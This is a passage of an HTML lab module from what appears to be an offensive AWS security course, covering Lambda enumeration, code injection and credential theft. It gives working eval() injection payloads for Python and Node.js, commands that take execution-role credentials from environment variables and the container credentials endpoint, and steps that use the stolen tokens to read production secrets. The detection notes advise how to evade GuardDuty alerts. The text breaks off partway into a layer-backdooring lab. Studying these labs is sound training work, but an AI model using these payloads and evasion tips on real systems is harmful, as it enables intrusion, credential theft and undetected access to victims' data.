@@ -1,0 +1,1040 @@
+<!-- M09: Lambda RCE Labs -->
+<div class="labs-container" id="m09-labs">
+
+  <!-- ============================================================ -->
+  <!-- LAB 1: Lambda Function Discovery and Enumeration             -->
+  <!-- ============================================================ -->
+  <div class="lab-walkthrough-content" id="M09-L01-content">
+    <div class="lab-objective">
+      <i class="fa-solid fa-crosshairs"></i>
+      <strong>Objective:</strong> Enumerate deployed Lambda functions in the target account, map their runtime environments, execution roles, and API Gateway triggers, and identify candidates for code injection attacks. After this lab, students will be able to list all Lambda functions across a large account using pagination, correlate functions to API Gateway endpoints, and triage targets by exploitability.
+      <br><br>
+      <strong>MITRE ATT&amp;CK:</strong> <a href="https://attack.mitre.org/techniques/T1526/" target="_blank">T1526 — Cloud Service Discovery</a>
+    </div>
+
+    <div class="lab-prereqs">
+      <i class="fa-solid fa-list-check"></i>
+      <strong>Prerequisites:</strong>
+      <ul>
+        <li>AWS CLI v2 installed: <code>aws --version</code> (must be v2.x — v1 does not support <code>--cli-binary-format</code>)</li>
+        <li>Compromised or lab AWS credentials configured as a named profile: <code>aws configure --profile lab-lambda</code></li>
+        <li>Minimum permissions needed: <code>lambda:ListFunctions</code>, <code>lambda:GetFunction</code>, <code>apigateway:GET</code></li>
+        <li>Region set in profile or passed via <code>--region</code> flag on every command</li>
+        <li>Authorized scope confirmed &mdash; all Lambda and API Gateway API calls appear in CloudTrail</li>
+      </ul>
+    </div>
+
+    <div class="lab-steps">
+
+      <!-- Step 1 -->
+      <div class="lab-step">
+        <div class="step-num">1</div>
+        <div class="step-content">
+          <div class="step-desc">List all Lambda functions in the target account. The <code>list-functions</code> API returns a maximum of 50 functions per page &mdash; always paginate using <code>--starting-token</code> or <code>--no-paginate</code> to avoid silently missing functions in large environments.</div>
+          <div class="terminal">
+            <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+            <div class="terminal-body">
+              <div class="terminal-cmd">$ aws lambda list-functions \
+  --query 'Functions[*].[FunctionName,Runtime,Role,Handler]' \
+  --output table \
+  --profile lab-lambda \
+  --region us-east-1</div>
+              <div class="terminal-output">--------------------------------------------------------------------------
+|                          ListFunctions                                 |
++----------------------------+----------+---------------------------------+-----------------+
+|  vulnerable-calc           |  python3.11  |  arn:aws:iam::123456789012:role/calc-exec   |  app.handler  |
+|  order-processor           |  nodejs18.x  |  arn:aws:iam::123456789012:role/order-role  |  index.handler|
+|  user-profile-api          |  python3.9   |  arn:aws:iam::123456789012:role/profile-ro  |  main.lambda_handler|
+|  internal-report-gen       |  python3.11  |  arn:aws:iam::123456789012:role/report-rw   |  report.run   |
++----------------------------+----------+---------------------------------+-----------------+</div>
+              <div class="terminal-cmd"># If NextMarker is present in the response, paginate:
+$ aws lambda list-functions \
+  --starting-token &lt;NextMarker-value&gt; \
+  --query 'Functions[*].[FunctionName,Runtime,Role]' \
+  --output table \
+  --profile lab-lambda \
+  --region us-east-1</div>
+              <div class="terminal-output"># (continues listing additional pages until no NextMarker is returned)</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Step 2 -->
+      <div class="lab-step">
+        <div class="step-num">2</div>
+        <div class="step-content">
+          <div class="step-desc">Retrieve the full configuration for a high-value target function. This reveals environment variables, memory/timeout settings, VPC placement, and the exact execution role ARN &mdash; all of which inform exploitation strategy.</div>
+          <div class="terminal">
+            <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+            <div class="terminal-body">
+              <div class="terminal-cmd">$ aws lambda get-function-configuration \
+  --function-name vulnerable-calc \
+  --profile lab-lambda \
+  --region us-east-1</div>
+              <div class="terminal-output">{
+    "FunctionName": "vulnerable-calc",
+    "FunctionArn": "arn:aws:lambda:us-east-1:123456789012:function:vulnerable-calc",
+    "Runtime": "python3.11",
+    "Role": "arn:aws:iam::123456789012:role/calc-exec-role",
+    "Handler": "app.handler",
+    "CodeSize": 842,
+    "Timeout": 30,
+    "MemorySize": 128,
+    "Environment": {
+        "Variables": {
+            "APP_ENV": "production",
+            "DB_HOST": "prod-rds.cluster.us-east-1.rds.amazonaws.com",
+            "LOG_LEVEL": "INFO"
+        }
+    },
+    "VpcConfig": {
+        "SubnetIds": [],
+        "SecurityGroupIds": [],
+        "VpcId": ""
+    },
+    "Layers": []
+}</div>
+              <div class="terminal-cmd"># VpcConfig is empty = function has direct outbound internet access
+# Role ARN identified = check what permissions this role has</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Step 3 -->
+      <div class="lab-step">
+        <div class="step-num">3</div>
+        <div class="step-content">
+          <div class="step-desc">Download the function's deployment package to inspect the source code directly. The presigned download URL is valid for 10 minutes.</div>
+          <div class="terminal">
+            <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+            <div class="terminal-body">
+              <div class="terminal-cmd">$ aws lambda get-function \
+  --function-name vulnerable-calc \
+  --query 'Code.Location' \
+  --output text \
+  --profile lab-lambda \
+  --region us-east-1</div>
+              <div class="terminal-output">https://awslambda-us-east-1-tasks.s3.amazonaws.com/snapshots/123456789012/vulnerable-calc-XXXX?AWSAccessKeyId=...&Expires=1705320000&Signature=...</div>
+              <div class="terminal-cmd">$ curl -s "$(aws lambda get-function \
+  --function-name vulnerable-calc \
+  --query 'Code.Location' \
+  --output text \
+  --profile lab-lambda \
+  --region us-east-1)" -o vulnerable-calc.zip && unzip vulnerable-calc.zip -d ./calc-src</div>
+              <div class="terminal-output">Archive:  vulnerable-calc.zip
+  inflating: ./calc-src/app.py</div>
+              <div class="terminal-cmd">$ cat ./calc-src/app.py</div>
+              <div class="terminal-output">import json
+
+def handler(event, context):
+    expression = event.get('expression', '')
+    # Evaluate the math expression directly — VULNERABLE TO CODE INJECTION
+    result = eval(expression)
+    return {'statusCode': 200, 'body': json.dumps({'result': result})}</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Step 4 -->
+      <div class="lab-step">
+        <div class="step-num">4</div>
+        <div class="step-content">
+          <div class="step-desc">Map which Lambda functions are exposed through API Gateway. A function reachable via API Gateway can be exploited without any AWS credentials &mdash; a much lower barrier for attackers.</div>
+          <div class="terminal">
+            <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+            <div class="terminal-body">
+              <div class="terminal-cmd">$ aws apigateway get-rest-apis \
+  --query 'items[*].[id,name,createdDate]' \
+  --output table \
+  --profile lab-lambda \
+  --region us-east-1</div>
+              <div class="terminal-output">------------------------------------------
+|           GetRestApis                  |
++------------+------------------+--------+
+|  a1b2c3d4  |  calc-api        |  2024-01-10|
+|  e5f6g7h8  |  order-api       |  2024-01-08|
++------------+------------------+--------+</div>
+              <div class="terminal-cmd">$ aws apigateway get-resources \
+  --rest-api-id a1b2c3d4 \
+  --query 'items[*].[id,path]' \
+  --output table \
+  --profile lab-lambda \
+  --region us-east-1</div>
+              <div class="terminal-output">--------------------------
+|       GetResources     |
++--------+---------------+
+|  r1s2  |  /            |
+|  t3u4  |  /calculate   |
++--------+---------------+</div>
+              <div class="terminal-cmd">$ aws apigateway get-integration \
+  --rest-api-id a1b2c3d4 \
+  --resource-id t3u4 \
+  --http-method POST \
+  --query '[type,uri]' \
+  --output json \
+  --profile lab-lambda \
+  --region us-east-1</div>
+              <div class="terminal-output">[
+    "AWS_PROXY",
+    "arn:aws:apigateway:us-east-1:lambda:path/2015-03-31/functions/arn:aws:lambda:us-east-1:123456789012:function:vulnerable-calc/invocations"
+]</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Step 5 -->
+      <div class="lab-step">
+        <div class="step-num">5</div>
+        <div class="step-content">
+          <div class="step-desc">Check the execution role's attached policies to understand the blast radius if you achieve code execution inside this function. The role's permissions define what attacker-controlled code running inside Lambda can do to the rest of the AWS environment.</div>
+          <div class="terminal">
+            <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+            <div class="terminal-body">
+              <div class="terminal-cmd">$ aws iam list-attached-role-policies \
+  --role-name calc-exec-role \
+  --output table \
+  --profile lab-lambda \
+  --region us-east-1</div>
+              <div class="terminal-output">-------------------------------------------------------
+|             ListAttachedRolePolicies                |
++---------------------------+--------------------------+
+|  AmazonS3FullAccess        |  arn:aws:iam::aws:policy/AmazonS3FullAccess    |
+|  AmazonDynamoDBFullAccess  |  arn:aws:iam::aws:policy/AmazonDynamoDBFullAccess|
+|  SecretsManagerReadWrite   |  arn:aws:iam::aws:policy/SecretsManagerReadWrite|
++---------------------------+--------------------------+</div>
+              <div class="terminal-cmd"># calc-exec-role has S3, DynamoDB, and Secrets Manager full/read-write access
+# RCE in this function = access to all three services in this account</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+    </div><!-- /.lab-steps -->
+
+    <div class="attack-flow">
+      <div class="flow-title"><i class="fa-solid fa-diagram-project"></i> Attack Flow</div>
+      <div class="flow-diagram">
+        <div class="flow-node">list-functions</div>
+        <div class="flow-arrow">&rarr;</div>
+        <div class="flow-node">get-function (download code)</div>
+        <div class="flow-arrow">&rarr;</div>
+        <div class="flow-node">Identify eval()</div>
+        <div class="flow-arrow">&rarr;</div>
+        <div class="flow-node">Map API GW trigger</div>
+        <div class="flow-arrow">&rarr;</div>
+        <div class="flow-node">Audit execution role</div>
+      </div>
+    </div>
+
+    <div class="lab-note">
+      <i class="fa-solid fa-triangle-exclamation"></i> <strong>Detection:</strong> <code>lambda:ListFunctions</code>, <code>lambda:GetFunction</code>, and <code>apigateway:GET*</code> all generate CloudTrail events. In a real engagement, spread these calls out or use them only after initial access to avoid triggering GuardDuty's <em>Recon:IAMUser/MaliciousIPCaller</em> finding. MITRE: <a href="https://attack.mitre.org/techniques/T1526/" target="_blank">T1526</a>.
+    </div>
+
+    <div class="lab-cleanup">
+      <i class="fa-solid fa-broom"></i>
+      <strong>Cleanup:</strong>
+      <ul>
+        <li>Delete the downloaded source files: <code>rm -rf ./calc-src vulnerable-calc.zip</code></li>
+        <li>Delete the notes file if created: <code>rm -f snapshot_targets.txt</code></li>
+        <li>No AWS resources were created in this lab &mdash; no teardown required</li>
+      </ul>
+    </div>
+
+  </div><!-- /#M09-L01-content -->
+
+  <hr class="lab-divider">
+
+  <!-- ============================================================ -->
+  <!-- LAB 2: Code Injection via eval/exec                          -->
+  <!-- ============================================================ -->
+  <div class="lab-walkthrough-content" id="M09-L02-content">
+    <div class="lab-objective">
+      <i class="fa-solid fa-crosshairs"></i>
+      <strong>Objective:</strong> Exploit an unsafe <code>eval()</code> call in a Python Lambda function to achieve arbitrary code execution inside the Lambda runtime. After this lab, students will be able to craft injection payloads for Python and Node.js Lambda functions, invoke functions with raw JSON payloads using AWS CLI v2, and confirm RCE via response output.
+      <br><br>
+      <strong>MITRE ATT&amp;CK:</strong> <a href="https://attack.mitre.org/techniques/T1059/006/" target="_blank">T1059.006 — Command and Scripting Interpreter: Python</a>
+    </div>
+
+    <div class="lab-prereqs">
+      <i class="fa-solid fa-list-check"></i>
+      <strong>Prerequisites:</strong>
+      <ul>
+        <li>Completed M09-L01: <code>vulnerable-calc</code> function identified with Python <code>eval()</code> vulnerability confirmed in source code</li>
+        <li>AWS CLI v2 required &mdash; the <code>--cli-binary-format raw-in-base64-out</code> flag does not exist in v1</li>
+        <li>Permission required: <code>lambda:InvokeFunction</code> on the target function</li>
+        <li>Target function is reachable via direct CLI invocation (or via its API Gateway URL from L01)</li>
+      </ul>
+    </div>
+
+    <div class="lab-steps">
+
+      <!-- Step 1 -->
+      <div class="lab-step">
+        <div class="step-num">1</div>
+        <div class="step-content">
+          <div class="step-desc">Understand the vulnerable code pattern you are exploiting. The function passes untrusted user input directly into Python's <code>eval()</code>, which executes arbitrary Python expressions &mdash; including OS commands via <code>__import__('os').popen()</code>.</div>
+          <div class="terminal">
+            <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+            <div class="terminal-body">
+              <div class="terminal-cmd"># Vulnerable Python Lambda pattern (from L01 code download):
+# -------------------------------------------------------
+# def handler(event, context):
+#     expression = event.get('expression', '')
+#     result = eval(expression)   &lt;-- VULNERABLE
+#     return {'statusCode': 200, 'body': json.dumps({'result': result})}
+#
+# Legitimate input: {"expression": "2 + 2"}
+# Malicious input:  {"expression": "__import__('os').popen('id').read()"}
+#                    ^ escapes math context, imports os module, runs shell cmd</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Step 2 -->
+      <div class="lab-step">
+        <div class="step-num">2</div>
+        <div class="step-content">
+          <div class="step-desc">Confirm the function accepts legitimate input first to establish a baseline response format before sending malicious payloads.</div>
+          <div class="terminal">
+            <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+            <div class="terminal-body">
+              <div class="terminal-cmd">$ aws lambda invoke \
+  --function-name vulnerable-calc \
+  --payload '{"expression":"2 + 2"}' \
+  --cli-binary-format raw-in-base64-out \
+  --profile lab-lambda \
+  --region us-east-1 \
+  output.txt && cat output.txt</div>
+              <div class="terminal-output">{"statusCode": 200, "body": "{\"result\": 4}"}</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Step 3 -->
+      <div class="lab-step">
+        <div class="step-num">3</div>
+        <div class="step-content">
+          <div class="step-desc">Inject the OS command execution payload. The <code>__import__('os').popen('id').read()</code> pattern works in any Python version without any imports already present in scope. AWS CLI v2 requires <code>--cli-binary-format raw-in-base64-out</code> when passing raw JSON &mdash; omitting this flag causes a base64 decode error.</div>
+          <div class="terminal">
+            <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+            <div class="terminal-body">
+              <div class="terminal-cmd">$ aws lambda invoke \
+  --function-name vulnerable-calc \
+  --payload '{"expression":"__import__(\"os\").popen(\"id\").read()"}' \
+  --cli-binary-format raw-in-base64-out \
+  --profile lab-lambda \
+  --region us-east-1 \
+  output.txt && cat output.txt</div>
+              <div class="terminal-output">{"statusCode": 200, "body": "{\"result\": \"uid=993(sbx_user1051) gid=990 groups=990\n\"}"}</div>
+              <div class="terminal-cmd"># Confirmed RCE: running as Lambda sandbox user uid=993
+# Lambda runtime is Amazon Linux 2 (or AL2023) inside a container</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Step 4 -->
+      <div class="lab-step">
+        <div class="step-num">4</div>
+        <div class="step-content">
+          <div class="step-desc">Expand the footprint by running additional discovery commands inside the Lambda execution environment.</div>
+          <div class="terminal">
+            <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+            <div class="terminal-body">
+              <div class="terminal-cmd">$ aws lambda invoke \
+  --function-name vulnerable-calc \
+  --payload '{"expression":"__import__(\"os\").popen(\"uname -a\").read()"}' \
+  --cli-binary-format raw-in-base64-out \
+  --profile lab-lambda \
+  --region us-east-1 \
+  output.txt && cat output.txt</div>
+              <div class="terminal-output">{"statusCode": 200, "body": "{\"result\": \"Linux 169.254.0.1 5.10.205-195.807.amzn2.x86_64 #1 SMP x86_64 GNU/Linux\n\"}"}</div>
+              <div class="terminal-cmd">$ aws lambda invoke \
+  --function-name vulnerable-calc \
+  --payload '{"expression":"__import__(\"os\").popen(\"ls /var/task\").read()"}' \
+  --cli-binary-format raw-in-base64-out \
+  --profile lab-lambda \
+  --region us-east-1 \
+  output.txt && cat output.txt</div>
+              <div class="terminal-output">{"statusCode": 200, "body": "{\"result\": \"app.py\\nrequirements.txt\\n\"}"}</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Step 5 -->
+      <div class="lab-step">
+        <div class="step-num">5</div>
+        <div class="step-content">
+          <div class="step-desc">Demonstrate the equivalent RCE pattern in a Node.js Lambda. The <code>child_process.execSync()</code> approach is the Node equivalent of Python's <code>os.popen()</code>.</div>
+          <div class="terminal">
+            <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+            <div class="terminal-body">
+              <div class="terminal-cmd"># Vulnerable Node.js Lambda pattern (for reference):
+# -------------------------------------------------------
+# exports.handler = async (event) => {
+#     const result = eval(event.expression);  // VULNERABLE
+#     return { statusCode: 200, body: JSON.stringify({ result }) };
+# };
+#
+# Exploitation payload for Node.js eval():
+$ aws lambda invoke \
+  --function-name vulnerable-node-fn \
+  --payload '{"expression":"require(\"child_process\").execSync(\"id\").toString()"}' \
+  --cli-binary-format raw-in-base64-out \
+  --profile lab-lambda \
+  --region us-east-1 \
+  output.txt && cat output.txt</div>
+              <div class="terminal-output">{"statusCode": 200, "body": "{\"result\": \"uid=993(sbx_user1051) gid=990 groups=990\n\"}"}</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+    </div><!-- /.lab-steps -->
+
+    <div class="attack-flow">
+      <div class="flow-title"><i class="fa-solid fa-diagram-project"></i> Attack Flow</div>
+      <div class="flow-diagram">
+        <div class="flow-node">Identify eval()</div>
+        <div class="flow-arrow">&rarr;</div>
+        <div class="flow-node">Baseline invocation</div>
+        <div class="flow-arrow">&rarr;</div>
+        <div class="flow-node">Inject OS payload</div>
+        <div class="flow-arrow">&rarr;</div>
+        <div class="flow-node">Confirm RCE (id/uname)</div>
+        <div class="flow-arrow">&rarr;</div>
+        <div class="flow-node">Enumerate runtime</div>
+      </div>
+    </div>
+
+    <div class="lab-note">
+      <i class="fa-solid fa-triangle-exclamation"></i> <strong>Detection:</strong> Every <code>lambda:InvokeFunction</code> call appears in CloudTrail with the caller identity. However, the <em>payload contents</em> are not logged &mdash; only that the function was invoked. GuardDuty does not inspect Lambda payloads. Defense relies on application-layer logging (Lambda Powertools, structured logging) and WAF rules if the function is behind API Gateway. MITRE: <a href="https://attack.mitre.org/techniques/T1059/006/" target="_blank">T1059.006</a>.
+    </div>
+
+    <div class="lab-cleanup">
+      <i class="fa-solid fa-broom"></i>
+      <strong>Cleanup:</strong>
+      <ul>
+        <li>Delete local output files: <code>rm -f output.txt</code></li>
+        <li>No AWS-side resources were created &mdash; invocation itself leaves no persistent artifacts</li>
+        <li>If this was a real engagement, rotate the function's execution role credentials immediately (see L03)</li>
+      </ul>
+    </div>
+
+  </div><!-- /#M09-L02-content -->
+
+  <hr class="lab-divider">
+
+  <!-- ============================================================ -->
+  <!-- LAB 3: Environment Variable and Credential Extraction        -->
+  <!-- ============================================================ -->
+  <div class="lab-walkthrough-content" id="M09-L03-content">
+    <div class="lab-objective">
+      <i class="fa-solid fa-crosshairs"></i>
+      <strong>Objective:</strong> Use the RCE foothold from L02 to extract the Lambda function's temporary IAM credentials from its execution environment and use them to escalate access within the target AWS account. After this lab, students will be able to extract credentials from Lambda environment variables and the ECS credentials endpoint, validate and characterize stolen STS credentials, and use them to enumerate further attack paths.
+      <br><br>
+      <strong>MITRE ATT&amp;CK:</strong> <a href="https://attack.mitre.org/techniques/T1552/005/" target="_blank">T1552.005 — Unsecured Credentials: Cloud Instance Metadata API</a>
+    </div>
+
+    <div class="lab-prereqs">
+      <i class="fa-solid fa-list-check"></i>
+      <strong>Prerequisites:</strong>
+      <ul>
+        <li>Completed M09-L02: confirmed RCE via <code>eval()</code> injection on <code>vulnerable-calc</code></li>
+        <li>AWS CLI v2 installed on attacker machine</li>
+        <li>Access to a second AWS CLI profile to use the stolen credentials (e.g., <code>--profile stolen-lambda</code>)</li>
+        <li>Note: stolen Lambda credentials are temporary STS tokens and expire within 1 hour &mdash; work quickly</li>
+      </ul>
+    </div>
+
+    <div class="lab-steps">
+
+      <!-- Step 1 -->
+      <div class="lab-step">
+        <div class="step-num">1</div>
+        <div class="step-content">
+          <div class="step-desc">Extract the Lambda execution role credentials directly from environment variables. Every Lambda function automatically receives temporary IAM credentials in three environment variables that correspond to the function's execution role.</div>
+          <div class="terminal">
+            <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+            <div class="terminal-body">
+              <div class="terminal-cmd">$ aws lambda invoke \
+  --function-name vulnerable-calc \
+  --payload '{"expression":"__import__(\"os\").popen(\"env | grep -E \\\"AWS_ACCESS|AWS_SECRET|AWS_SESSION\\\"\").read()"}' \
+  --cli-binary-format raw-in-base64-out \
+  --profile lab-lambda \
+  --region us-east-1 \
+  out.txt && cat out.txt</div>
+              <div class="terminal-output">{"statusCode": 200, "body": "{\"result\": \"AWS_ACCESS_KEY_ID=ASIAIOSFODNN7EXAMPLE\\nAWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\\nAWS_SESSION_TOKEN=AQoXnyc4lcK4a7QJe2e...truncated...\\n\"}"}</div>
+              <div class="terminal-cmd"># ASIA prefix = temporary STS credentials (not long-term AKIA)
+# These expire within 1 hour — configure them immediately</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Step 2 -->
+      <div class="lab-step">
+        <div class="step-num">2</div>
+        <div class="step-content">
+          <div class="step-desc">Alternatively, retrieve credentials via the ECS task metadata credential endpoint. This endpoint is available inside any Lambda (which uses the same credential delegation mechanism as ECS). This approach avoids the <code>env</code> command being blocked by application filtering.</div>
+          <div class="terminal">
+            <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+            <div class="terminal-body">
+              <div class="terminal-cmd">$ aws lambda invoke \
+  --function-name vulnerable-calc \
+  --payload '{"expression":"__import__(\"subprocess\").check_output([\"sh\",\"-c\",\"curl -s http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI\"]).decode()"}' \
+  --cli-binary-format raw-in-base64-out \
+  --profile lab-lambda \
+  --region us-east-1 \
+  out.txt && python3 -c "import json,sys; d=json.load(open('out.txt')); print(json.dumps(json.loads(d['body'])['result'], indent=2))"</div>
+              <div class="terminal-output">{
+  "RoleArn": "arn:aws:iam::123456789012:role/calc-exec-role",
+  "AccessKeyId": "ASIAIOSFODNN7EXAMPLE",
+  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
+  "Token": "AQoXnyc4lcK4a7QJe2e...truncated...",
+  "Expiration": "2024-01-15T14:00:00Z"
+}</div>
+              <div class="terminal-cmd"># Expiration shows 1 hour window — confirms STS credentials</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Step 3 -->
+      <div class="lab-step">
+        <div class="step-num">3</div>
+        <div class="step-content">
+          <div class="step-desc">Configure the stolen Lambda credentials as a new attacker profile and immediately verify they are valid and identify which role they represent.</div>
+          <div class="terminal">
+            <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+            <div class="terminal-body">
+              <div class="terminal-cmd">$ export AWS_ACCESS_KEY_ID=ASIAIOSFODNN7EXAMPLE
+$ export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
+$ export AWS_SESSION_TOKEN=AQoXnyc4lcK4a7QJe2e...truncated...
+$ aws sts get-caller-identity</div>
+              <div class="terminal-output">{
+    "UserId": "AROAI3QJYM3WEXAMPLE:vulnerable-calc",
+    "Account": "123456789012",
+    "Arn": "arn:aws:sts::123456789012:assumed-role/calc-exec-role/vulnerable-calc"
+}</div>
+              <div class="terminal-cmd"># Identity confirmed as the calc-exec-role assumed by vulnerable-calc function
+# Now use these credentials to abuse the role's S3/DynamoDB/Secrets Manager access</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Step 4 -->
+      <div class="lab-step">
+        <div class="step-num">4</div>
+        <div class="step-content">
+          <div class="step-desc">Leverage the stolen execution role credentials to access Secrets Manager &mdash; one of the permissions identified in L01. This demonstrates credential theft leading directly to further escalation.</div>
+          <div class="terminal">
+            <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+            <div class="terminal-body">
+              <div class="terminal-cmd">$ aws secretsmanager list-secrets \
+  --query 'SecretList[*].[Name,ARN]' \
+  --output table \
+  --region us-east-1</div>
+              <div class="terminal-output">------------------------------------------------------------------
+|                         ListSecrets                            |
++-------------------------------+--------------------------------+
+|  prod/rds/master-password     |  arn:aws:secretsmanager:...    |
+|  prod/stripe/api-key          |  arn:aws:secretsmanager:...    |
+|  internal/jwt-signing-key     |  arn:aws:secretsmanager:...    |
++-------------------------------+--------------------------------+</div>
+              <div class="terminal-cmd">$ aws secretsmanager get-secret-value \
+  --secret-id prod/rds/master-password \
+  --query 'SecretString' \
+  --output text \
+  --region us-east-1</div>
+              <div class="terminal-output">{"username":"admin","password":"Pr0dRDS!P@ssw0rd2024","host":"prod-rds.cluster.us-east-1.rds.amazonaws.com","port":5432}</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Step 5 -->
+      <div class="lab-step">
+        <div class="step-num">5</div>
+        <div class="step-content">
+          <div class="step-desc">Also extract any additional secrets stored directly in the function's environment variables (not execution role credentials, but application-level secrets configured at deploy time). These are often overlooked by defenders since they appear in function configuration, not CloudTrail.</div>
+          <div class="terminal">
+            <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+            <div class="terminal-body">
+              <div class="terminal-cmd">$ aws lambda invoke \
+  --function-name vulnerable-calc \
+  --payload '{"expression":"__import__(\"os\").popen(\"env\").read()"}' \
+  --cli-binary-format raw-in-base64-out \
+  --profile lab-lambda \
+  --region us-east-1 \
+  out.txt && cat out.txt</div>
+              <div class="terminal-output">{"statusCode": 200, "body": "{\"result\": \"AWS_ACCESS_KEY_ID=ASIAIOSFODNN7EXAMPLE\\nAWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\\nAWS_SESSION_TOKEN=AQoX...\\nDB_HOST=prod-rds.cluster.us-east-1.rds.amazonaws.com\\nAPP_ENV=production\\nLOG_LEVEL=INFO\\n\"}"}</div>
+              <div class="terminal-cmd"># DB_HOST exposed — pair with the RDS password from Secrets Manager above
+# Cross-reference env vars with the GetFunctionConfiguration output from L01</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+    </div><!-- /.lab-steps -->
+
+    <div class="attack-flow">
+      <div class="flow-title"><i class="fa-solid fa-diagram-project"></i> Attack Flow</div>
+      <div class="flow-diagram">
+        <div class="flow-node">RCE via eval()</div>
+        <div class="flow-arrow">&rarr;</div>
+        <div class="flow-node">env | grep AWS_*</div>
+        <div class="flow-arrow">&rarr;</div>
+        <div class="flow-node">Steal STS token</div>
+        <div class="flow-arrow">&rarr;</div>
+        <div class="flow-node">get-caller-identity</div>
+        <div class="flow-arrow">&rarr;</div>
+        <div class="flow-node">Access Secrets Manager</div>
+      </div>
+    </div>
+
+    <div class="lab-note">
+      <i class="fa-solid fa-triangle-exclamation"></i> <strong>Detection:</strong> The credential theft itself leaves no CloudTrail log &mdash; it happens inside the Lambda runtime via environment variables or the ECS metadata endpoint, which are not audited. However, <em>using</em> the stolen credentials from an unexpected IP generates CloudTrail events with the role ARN and the external caller IP. GuardDuty's <em>UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS</em> finding fires when Lambda/EC2 credentials are used outside of AWS IP ranges. Use a VPS within the AWS IP range to avoid this. MITRE: <a href="https://attack.mitre.org/techniques/T1552/005/" target="_blank">T1552.005</a>.
+    </div>
+
+    <div class="lab-cleanup">
+      <i class="fa-solid fa-broom"></i>
+      <strong>Cleanup:</strong>
+      <ul>
+        <li>Unset the stolen credential environment variables: <code>unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN</code></li>
+        <li>Delete local output files: <code>rm -f out.txt</code></li>
+        <li>Stolen STS credentials expire automatically within 1 hour &mdash; no revocation needed for lab</li>
+        <li>In a real engagement, document exfiltrated credentials and report to client for rotation</li>
+      </ul>
+    </div>
+
+  </div><!-- /#M09-L03-content -->
+
+  <hr class="lab-divider">
+
+  <!-- ============================================================ -->
+  <!-- LAB 4: Lambda Layer Poisoning                                -->
+  <!-- ============================================================ -->
+  <div class="lab-walkthrough-content" id="M09-L04-content">
+    <div class="lab-objective">
+      <i class="fa-solid fa-crosshairs"></i>
+      <strong>Objective:</strong> Inject malicious code into a shared Lambda Layer to achieve persistent code execution across multiple functions that consume it. After this lab, students will be able to download an existing layer, inject a backdoor, publish a new layer version, and update a function's layer reference to point to the malicious version.
+      <br><br>
+      <strong>MITRE ATT&amp;CK:</strong> <a href="https://attack.mitre.org/techniques/T1525/" target="_blank">T1525 — Implant Internal Image</a> | <a href="https://attack.mitre.org/techniques/T1546/" target="_blank">T1546 — Event Triggered Execution</a>
+    </div>
+
+    <div class="lab-prereqs">
+      <i class="fa-solid fa-list-check"></i>
+      <strong>Prerequisites:</strong>
+      <ul>
+        <li>Credentials with the following permissions (from stolen execution role or direct access): <code>lambda:GetLayerVersion</code>, <code>lambda:PublishLayerVersion</code>, <code>lambda:UpdateFunctionConfiguration</code>, <code>lambda:GetFunctionConfiguration</code></li>
+        <li><code>zip</code> and <code>unzip</code> installed on attacker machine</li>
+        <li>Python 3 available for injecting into Python layer packages</li>
+        <li>Target function identified that uses at least one Lambda Layer</li>
+      </ul>
+    </div>
+
+    <div class="lab-steps">
+
+      <!-- Step 1 -->
+      <div class="lab-step">
+        <div class="step-num">1</div>
+        <div class="step-content">
+          <div class="step-desc">Identify which Lambda functions use Layers and retrieve the current layer ARN and version number from the function configuration.</div>
+          <div class="terminal">
+            <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+            <div class="terminal-body">
+              <div class="terminal-cmd">$ aws lambda get-function-configuration \
+  --function-name order-processor \
